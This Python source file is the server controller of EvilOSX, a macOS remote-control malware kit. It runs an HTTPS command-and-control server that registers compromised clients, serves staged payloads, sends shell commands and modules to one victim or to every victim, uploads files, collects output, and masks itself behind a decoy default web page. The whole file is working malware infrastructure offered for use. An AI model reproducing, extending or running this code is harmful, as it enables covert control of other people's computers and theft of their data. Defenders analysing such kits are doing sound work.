"""The controller for the view."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

from socketserver import ThreadingMixIn
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import threading

from .version import VERSION
from .model import ModuleFactory, LoaderFactory, PayloadFactory, Command, Client
from urwid import ExitMainLoop
from time import time
import base64
import json
from urllib.parse import unquote_plus
import shutil
import os
from ssl import SSLError
from pathlib import Path
from queue import Queue
from textwrap import dedent


class Controller:
    """This class controls the view."""

    def __init__(self, client_model, view, server_port):
        self._client_model = client_model
        self._view = view
        self._server_port = server_port

        self._module_factory = ModuleFactory()
        self._loader_factory = LoaderFactory()
        self._current_client = None

        # Startup messages
        self._view.set_header_text("EvilOSX v{} | Port: {}".format(VERSION, server_port))
        self._view.output("Server started, waiting for connections...", "info")
        self._view.output("Type \"help\" to get a list of available commands.", "info")

        self._register_listeners()
        self._start_server()

    def _register_listeners(self):
        """Registers the listeners fired by the view."""
        self._view.set_on_command(self._process_command)

    def _start_server(self):
        """Starts the multi-threaded HTTPS server in it's own thread."""
        server = _ThreadedHTTPServer(('', self._server_port), _ClientHTTPController)
        server.socket = ssl.wrap_socket(server.socket, keyfile="server.key", certfile="server.cert", server_side=True)

        # Via __init__ is a pain, trust me...
        _ClientHTTPController._view = self._view
        _ClientHTTPController._loader_factory = self._loader_factory
        _ClientHTTPController._module_factory = self._module_factory
        _ClientHTTPController._client_model = self._client_model

        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True  # Exit when the main method finishes.
        server_thread.start()

    def _process_command(self, command):
        """Processes command input."""
        self._view.output_separator()

        if command == "help":
            self._view.output("help             -   Show this help menu.")
            self._view.output("clients          -   Show a list of clients.")
            self._view.output("connect <ID>     -   Connect to the client.")
            self._view.output("modules          -   Show a list of available modules.")
            self._view.output("use <module>     -   Run the module on the connected client.")
            self._view.output("useall <module>  -   Run the module on every client.")
            self._view.output("kill <task_name> -   Kills the running task (background module).")
            if not self._current_client:
                self._view.output("exit/q/quit      -   Close the server and exit.")
            else:
                self._view.output("exit/q/quit      -   Stop interacting with client.")
                self._view.output("Any other command will be run on the client.")
        elif command == "clients":
            clients = self._client_model.get_clients()

            if not clients:
                self._view.output("No available clients.", "attention")
            else:
                self._view.output(str(len(clients)) + " client(s) available:", "info")

                for i, client in enumerate(clients):
                    self._view.output("    %s = %s@%s (%s)" % (
                        str(i), client.username, client.hostname, client.remote_ip
                    ))
        elif command.startswith("connect"):
            try:
                specified_id = int(command.split(" ")[1])
                self._current_client = self._client_model.get_clients()[specified_id]

                self._view.output("Connected to \"%s@%s\", ready to send commands." % (
                    self._current_client.username, self._current_client.hostname
                ), "info")
                self._view.set_footer_text("Command ({}@{}): ".format(
                    self._current_client.username, self._current_client.hostname
                ))
            except (IndexError, ValueError):
                self._view.output("Invalid client ID (see \"clients\").", "attention")
                self._view.output("Usage: connect <ID>", "attention")
        elif command == "modules":
            modules = self._module_factory.get_modules()

            if not modules:
                self._view.output(
                    "Failed to find modules, please restart and make sure you are running "
                    "the start command in the correct directory (in EvilOSX/).",
                    "attention"
                )
                self._view.output("Server start command: python server/server.py", "attention")
            else:
                special_modules = {
                    # Special modules used by loaders
                    "remove_client": "Removes EvilOSX from the client.",
                    "update_client": "Updates the client to a newer version of EvilOSX."
                }

                for key, value in special_modules.items():
                    self._view.output("{0: <18} -   {1}".format(key, value))

                for module_name, module_imp in modules.items():
                    self._view.output("{0: <18} -   {1}".format(module_name, module_imp.get_info()["Description"]))
        elif command.startswith("useall"):
            module_name = command.replace("useall ", "").strip()

            if module_name == "useall":
                self._view.output("Invalid module name (see \"modules\").", "attention")
                self._view.output("Usage: useall <module>", "attention")
            else:
                if not self._client_model.has_clients():
                    self._view.output("No available clients", "attention")
                else:
                    self._run_module(module_name, mass_execute=True)
        elif command == "clear":
            self._view.clear()
        elif command in ["q", "quit", "exit"] and not self._current_client:
            self._client_model.close()
            raise ExitMainLoop()
        else:
            # Commands that require an active connection.
            if not self._current_client:
                self._view.output("Not connected to a client (see \"connect\").", "attention")
            else:
                if (time() - float(self._current_client.last_online)) >= 60:
                    self._view.output("The client is idle and will take longer to respond.", "attention")

                if command in ["q", "quit", "exit"]:
                    self._view.output("Disconnected from \"%s@%s\"." % (
                        self._current_client.username, self._current_client.hostname
                    ), "info")

                    self._current_client = None
                    self._view.set_footer_text("Command: ")
                elif command.startswith("use"):
                    # Execute a module
                    module_name = command.replace("use ", "").strip()

                    if module_name == "use":
                        self._view.output("Invalid module name (see \"modules\").", "attention")
                        self._view.output("Usage: use <module>", "attention")
                    else:
                        self._run_module(module_name)
                elif command.startswith("kill"):
                    # Kills a running task.
                    task_name = command.replace("kill ", "").strip()

                    if task_name == "kill":
                        self._view.output("Invalid task name (see \"modules\").", "attention")
                        self._view.output("Usage: kill <task_name>", "attention")
                    elif task_name.isdigit():
                        # Let the user kill regular processes.
                        self._view.output("Killing system process instead of module.", "attention")

                        self._client_model.send_command(Command(
                            self._current_client.id, base64.b64encode(("kill " + task_name).encode()).decode())
                        )
                    else:
                        self._view.output("Attempting to kill task \"{}\"...".format(task_name), "info")

                        self._client_model.send_command(Command(
                            self._current_client.id, base64.b64encode("kill_task".encode()).decode(), task_name
                        ))
                else:
                    # Send a system command.
                    self._view.output("Running command: " + command, "info")

                    self._client_model.send_command(Command(
                        self._current_client.id, base64.b64encode(command.encode()).decode()
                    ))

    def _run_module(self, module_name, mass_execute=False):
        """Runs a module."""
        if module_name in ["remove_client", "update_client"]:
            # Special modules used by loaders
            loader_name = self._current_client.loader_name
            loader = self._loader_factory.get_loaders()[loader_name]

            if module_name == "remove_client":
                # Note: The controller will remove the client from the database.

                if mass_execute:
                    clients = self._client_model.get_clients()

                    self._view.output("Removing {} client(s) using the \"{}\" loader...".format(
                        len(clients), loader_name
                    ), "info")

                    for client in clients:
                        self._client_model.send_command(Command(
                            client.id, base64.b64encode(loader.remove_payload().encode()).decode(), "remove_client"
                        ))

                    if self._current_client in clients:
                        self._process_command("quit")
                else:
                    self._view.output("Removing the client using the \"{}\" loader...".format(
                        loader_name
                    ), "info")

                    self._client_model.send_command(Command(
                        self._current_client.id, base64.b64encode(loader.remove_payload().encode()).decode(),
                        "remove_client"
                    ))

                    self._process_command("quit")
            elif module_name == "update_client":
                self._view.output(
                    "This module will be added at a later time, feel free to complain on GitHub.",
                    "attention"
                )
        else:
            try:
                module_imp = self._module_factory.get_module(module_name)

                self._view.set_module_input(module_name)  # Switch to the module input.

                # Start the setup process in it's own thread so when the module
                # waits for user input we don't block the main thread.
                setup_thread = threading.Thread(
                    target=self._module_setup,
                    args=(module_name, module_imp, self._view.get_module_input(), self._view, mass_execute)
                )
                setup_thread.daemon = True
                setup_thread.start()
            except KeyError:
                self._view.output("That module doesn't exist!", "attention")

    def _module_setup(self, module_name, module_imp, module_input, view, mass_execute):
        """Handles the module setup process, run in a separate thread."""
        successful = Queue()

        module_imp.setup(module_input, view, successful)

        if successful.get():
            module_code = base64.b64encode(dedent(module_imp.run()).encode()).decode()
            is_task = module_imp.get_info()["Task"]

            if is_task:
                self._view.output("This module is a background task, use \"kill {}\" to stop it.".format(
                    module_name
                ), "info")

            if mass_execute:
                # Run this module on every client.
                clients = self._client_model.get_clients()

                self._view.output("Running module \"{}\" on {} client(s)...".format(
                    module_name, len(clients)
                ), "info")

                for client in clients:
                    self._client_model.send_command(Command(
                        client.id, module_code, module_name, is_task
                    ))
            else:
                self._view.output("Running module \"{}\"...".format(module_name), "info")
                
                self._client_model.send_command(Command(
                    self._current_client.id, module_code, module_name, is_task
                ))

        self._view.set_command_input()


class _ClientHTTPController(BaseHTTPRequestHandler):
    """Server which controls clients over the HTTPS protocol.

    Provides only the communication layer, all other functionality is handled by modules.
    """
    _view = None
    _loader_factory = None
    _payload_factory = None
    _module_factory = None
    _client_model = None

    def _send_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_POST(self):
        """Handles POST requests."""
        data = str(self.rfile.read(int(self.headers.get("Content-Length"))), "utf-8")

        if self.path == "/api/stager":
            # Send back a unique encrypted payload which the stager will run.
            client_key = data.split("&")[0].split("=")[1]
            base64_payload_options = unquote_plus(data.split("&")[1]).replace("Cookie=session=", "", 1)

            payload_options = json.loads(
                base64.b64decode(base64_payload_options.encode())
            )
            loader_options = payload_options["loader_options"]

            self._view.output_separator()
            self._view.output("[{}] Creating payload using key: {}".format(
                payload_options["loader_name"], client_key
            )), "info"

            if not self._payload_factory:
                self._payload_factory = PayloadFactory(self._loader_factory)

            self.wfile.write(self._payload_factory.create_payload(
                payload_options, loader_options, client_key
            ).encode())
        elif self.path == "/api/get_command":
            # Command requests
            username = data.split("&")[0].replace("username=", "", 1)
            hostname = data.split("&")[1].replace("hostname=", "", 1)
            loader_name = data.split("&")[2].replace("loader=", "", 1)
            client_id = data.split("&")[3].replace("client_id=", "", 1)
            path = unquote_plus(data.split("&")[4].replace("path=", "", 1))
            remote_ip = unquote_plus(data.split("&")[5].replace("remote_ip=", "", 1))

            client = self._client_model.get_client(client_id)

            if not client:
                # This is the first time this client has connected.
                self._view.output_separator()
                self._view.output("New client \"{}@{}\" connected!".format(username, hostname), "info")

                self._client_model.add_client(Client(
                    client_id, username, hostname, remote_ip,
                    path, time(), loader_name
                ))

                self._send_headers()
                self.wfile.write(b"You dun goofed.")
            else:
                # Update the client's session (path and last_online).
                self._client_model.update_client(client_id, path, time())

                # Send any pending commands to the client.
                command = self._client_model.get_command(client_id)

                if command:
                    self._client_model.remove_command(command.id)

                    # Special modules which need the server to do extra stuff.
                    if command.module_name in ["update_client", "remove_client"]:
                        self._client_model.remove_client(client_id)

                        self._send_headers()
                        self.wfile.write(str(command).encode())
                    elif command.module_name == "upload":
                        file_path = base64.b64decode(command.command.encode()).decode().split(":")[0].replace("\n", "")
                        file_name = os.path.basename(file_path)

                        self._view.output_separator()
                        self._view.output("Sending file to client...", "info")

                        with open(file_path, "rb") as input_file:
                            file_size = os.fstat(input_file.fileno())

                            self.send_response(200)
                            self.send_header("Content-Type", "application/octet-stream")
                            self.send_header("Content-Disposition", "attachment; filename=\"{}\"".format(file_name))
                            self.send_header("Content-Length", str(file_size.st_size))
                            self.send_header("X-Upload-Module", command.command)
                            self.end_headers()

                            shutil.copyfileobj(input_file, self.wfile)
                    else:
                        self._send_headers()
                        self.wfile.write(str(command).encode())
                else:
                    # Client has no pending commands.
                    self._send_headers()
                    self.wfile.write(b"")
        elif self.path == "/api/response":
            # Command responses
            json_response = json.loads(base64.b64decode(unquote_plus(data.replace("output=", "", 1)).encode()))
            response = base64.b64decode(json_response["response"].encode())
            module_name = json_response["module_name"]

            self._send_headers()

            if module_name:
                # Send the response back to the module
                for name, module_imp in self._module_factory.get_modules().items():
                    if name == module_name:
                        module_imp.process_response(response, self._view)
                        break
            else:
                # Command response
                self.output_response(response)

    def output_response(self, response):
        """Sends the response to the output view."""
        self._view.output_separator()

        response = response.decode()  # From here on we need a str not bytes.

        if "\n" in response:
            for line in response.splitlines():
                self._view.output(*self._get_prefix_type(line))
        else:
            self._view.output(*self._get_prefix_type(response))

    @staticmethod
    def _get_prefix_type(line: str) -> tuple:
        """:return A tuple containing the clean line and prefix type."""
        message_info = "\033[94m" + "[I] " + "\033[0m"
        message_attention = "\033[91m" + "[!] " + "\033[0m"

        if line.startswith(message_info):
            return line.replace(message_info, "", 1), "info"
        elif line.startswith(message_attention):
            return line.replace(message_attention, "", 1), "attention"
        else:
            return line, ""

    def do_GET(self):
        self._send_headers()

        if self.path == "/api/get_ca":
            # Send back our certificate authority.
            with open(os.path.join(Path(__file__).parent.parent, "server.cert")) as input_file:
                self.wfile.write(base64.b64encode(input_file.read().encode()))
        else:
            # Show a standard looking page.
            page = """\
            <html><body><h1>It works!</h1>
            <p>This is the default web page for this server.</p>
            <p>The web server software is running but no content has been added, yet.</p>
            </body></html>
            """
            self.wfile.write(page.encode())

    def handle(self):
        try:
            BaseHTTPRequestHandler.handle(self)
        except SSLError as ex:
            if "alert unknown ca" in str(ex):
                # See https://support.mozilla.org/en-US/kb/troubleshoot-SEC_ERROR_UNKNOWN_ISSUER
                self._view.output("Showing \"Your connection is not secure\" message to user.", "attention")
            else:
                self._view.output("Error: " + str(ex), "attention")

    def log_message(self, format, *args):
        return  # Don't log random stuff we don't care about, thanks.


class _ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
    pass
